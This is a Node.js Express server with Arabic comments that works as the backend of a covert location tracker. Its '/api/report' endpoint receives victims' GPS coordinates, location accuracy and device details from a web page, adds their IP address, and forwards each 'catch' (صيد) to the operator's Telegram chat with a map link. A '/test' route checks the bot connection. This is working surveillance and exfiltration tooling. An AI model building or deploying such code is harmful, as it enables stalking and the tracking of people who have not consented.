require('dotenv').config();
const express = require('express');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static('public'));

// 🤖 دالة إرسال التليجرام (نسخة قوية جداً ومعالجة للأخطاء)
function pushToTelegram(text) {
    return new Promise((resolve) => {
        const token = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;

        if (!token || !chatId) {
            console.error("❌ خطأ: لم يتم ضبط TELEGRAM_BOT_TOKEN أو TELEGRAM_CHAT_ID في ملف .env");
            return resolve(false);
        }

        const data = JSON.stringify({
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${token}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            },
            timeout: 10000 // 10 ثواني انتظار
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', d => body += d);
            res.on('end', () => {
                const result = JSON.parse(body);
                if (result.ok) {
                    console.log("✅ وصلت الرسالة بنجاح!");
                    resolve(true);
                } else {
                    console.error("❌ فشل تليجرام:", result.description);
                    resolve(false);
                }
            });
        });

        req.on('error', (e) => {
            console.error("❌ خطأ في الشبكة:", e.message);
            resolve(false);
        });

        req.write(data);
        req.end();
    });
}

// 🛠️ رابط اختبار البوت (افتحه في متصفحك: /test)
app.get('/test', async (req, res) => {
    const ok = await pushToTelegram("🔔 <b>رسالة اختبار:</b> البوت متصل والربط سليم!");
    if (ok) res.send("<h1>✅ تم الإرسال! راجع بوت التليجرام الآن.</h1>");
    else res.send("<h1>❌ فشل الإرسال! راجع سجلات السيرفر (Logs) على Render.</h1>");
});

// 🎯 استقبال الصيد
app.post('/api/report', async (req, res) => {
    res.status(200).send("OK"); // رد لحظي

    (async () => {
        try {
            const d = req.body;
            const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

            const report = `
🎯 <b>صيد جديد</b> 🔥
━━━━━━━━━━━
📍 <b>GPS:</b>
<code>${d.lat}, ${d.lon}</code>
🗺️ <a href="https://www.google.com/maps?q=${d.lat},${d.lon}">فتح الموقع</a>
🎯 <b>الدقة:</b> ${d.acc || '؟'}

🌐 <b>الشبكة:</b>
• <b>الـ IP:</b> <code>${ip}</code>
• <b>الوقت:</b> ${d.time || '؟'}

📱 <b>الجهاز:</b>
• <b>النظام:</b> ${d.plat || '؟'}
• <b>الشاشة:</b> ${d.screen || '؟'}
• <b>المعالج:</b> ${d.cores || '؟'}
• <b>الرام:</b> ${d.ram || '؟'}
━━━━━━━━━━━`;

            await pushToTelegram(report);
        } catch (e) {
            console.error("خطأ معالجة:", e.message);
        }
    })();
});

app.listen(PORT, () => console.log(`🚀 السيرفر يعمل على منفذ ${PORT}`));
